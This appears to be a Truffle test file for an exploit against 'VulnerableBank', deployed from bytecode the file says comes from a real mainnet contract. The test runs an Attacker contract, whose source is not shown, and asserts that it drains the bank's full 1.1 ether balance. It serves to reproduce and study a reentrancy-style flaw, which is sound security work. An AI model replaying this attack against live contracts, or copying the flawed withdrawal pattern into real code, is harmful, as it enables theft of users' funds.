const Extensions = require("../utils/extensions.js");
Extensions.init(web3, assert);

contract('VulnerableBank', function(accounts) {

    var vulnerableBank, attacker;

    beforeEach("should deploy a VulnerableBank as per the main net", function() {
        // Take the real deploy bytecode from here https://etherscan.io/tx/0x5baba97ad8a9c9be904fea4062b56ddec472608004bbefd4e2a1ff0b24bb8164
        VulnerableBank.unlinked_binary = "0x606060405234610000575b6105e3806100196000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806326224c641461005f578063ccd6e5b6146100a6578063d0e30db0146100dd578063f8b2cb4f146100e7575b610000565b3461000057610090600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061012e565b6040518082815260200191505060405180910390f35b6100db600480803590602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610146565b005b6100e56104b2565b005b3461000057610118600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061056d565b6040518082815260200191505060405180910390f35b60006020528060005260406000206000915090505481565b6000339050600060008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483111561026f577f54c25aa230f7ee0c1e146d3416a3a4972d9fa34640b86e84383b461a585593de81838560405180806020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018381526020018281038252601e8152602001807f416d6f756e742067726561746572207468616e2062616c616e63652e2e2e000081525060200194505050505060405180910390a16104ac565b8173ffffffffffffffffffffffffffffffffffffffff168360405180905060006040518083038185876185025a03f1925050501515610385577f54c25aa230f7ee0c1e146d3416a3a4972d9fa34640b86e84383b461a585593de81838560405180806020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001838152602001828103825260188152602001807f43616c6c2e76616c75652077656e742077726f6e672e2e2e000000000000000081525060200194505050505060405180910390a16104ab565b82600060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055507f54c25aa230f7ee0c1e146d3416a3a4972d9fa34640b86e84383b461a585593de81838560405180806020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001838152602001828103825260118152602001807f5061796d656e742065786563757465642e00000000000000000000000000000081525060200194505050505060405180910390a15b5b5b505050565b7fe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c3334604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a134600060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b565b6000600060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490505b9190505600a165627a7a72305820947076c9c1bef248b17f1c4f74742ecbc4dfc65e21440962ae8e4e0c4220492c0029";
        return VulnerableBank.new({ from: accounts[0] })
            .then(created => {
                vulnerableBank = created;
                // Give it the same balance as at block 3160800
                return created.deposit({ value: "1100000000000000000" });
            })
            .then(web3.eth.getTransactionReceiptMined);
    });

    beforeEach("should deploy an attacker", function() {
        return Attacker.new(vulnerableBank.address, { from: accounts[0] })
            .then(created => {
                attacker = created;
            });
    });

    it("should attack successfully", function() {
        return attacker            //           1100000000000000000
            .attack({ from: accounts[0], value: "550000000000000000", gas: 4000000 })
            .then(web3.eth.getTransactionReceiptMined)
            .then(receipt => {
                assert.isAtMost(receipt.gasUsed, "3999999");
                return Promise.all([
                        web3.eth.getBalancePromise(attacker.address),
                        web3.eth.getBalancePromise(vulnerableBank.address)
                    ]);
            })
            .then(balances => {
                assert.strictEqual(balances[0].toString(10), "1650000000000000000");
                assert.strictEqual(balances[1].toString(10), "0");
                console.log("attacker", web3.fromWei(balances[0]));
                console.log("vulnerable", web3.fromWei(balances[1]));
            });
    });

});